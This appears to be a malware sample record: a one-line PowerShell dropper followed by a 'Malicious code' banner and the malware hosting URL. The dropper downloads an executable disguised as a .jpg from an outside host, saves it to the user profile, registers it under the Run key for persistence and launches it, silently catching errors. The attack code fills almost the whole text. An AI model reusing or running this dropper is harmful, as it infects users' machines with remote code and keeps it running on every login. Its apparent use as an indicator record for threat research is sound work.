try{(New-Object System.Net.WebClient).DownloadFile('http://i.cubeupload.com/RDlSmN.jpg',$env:USERPROFILE+'\wxxVBzVQatklC.exe');$faiyjYjCMqCMNryyElHoMlmf =$env:USERPROFILE+'\wxxVBzVQatklC.exe';New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Keyname' -Value $faiyjYjCMqCMNryyElHoMlmf -PropertyType 'String' -Force | Out-Null;(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\wxxVBzVQatklC.exe');}catch {}
############################## Malicious code  ##############################
Malware hosting URLs: http://i.cubeupload.com/RDlSmN.jpg
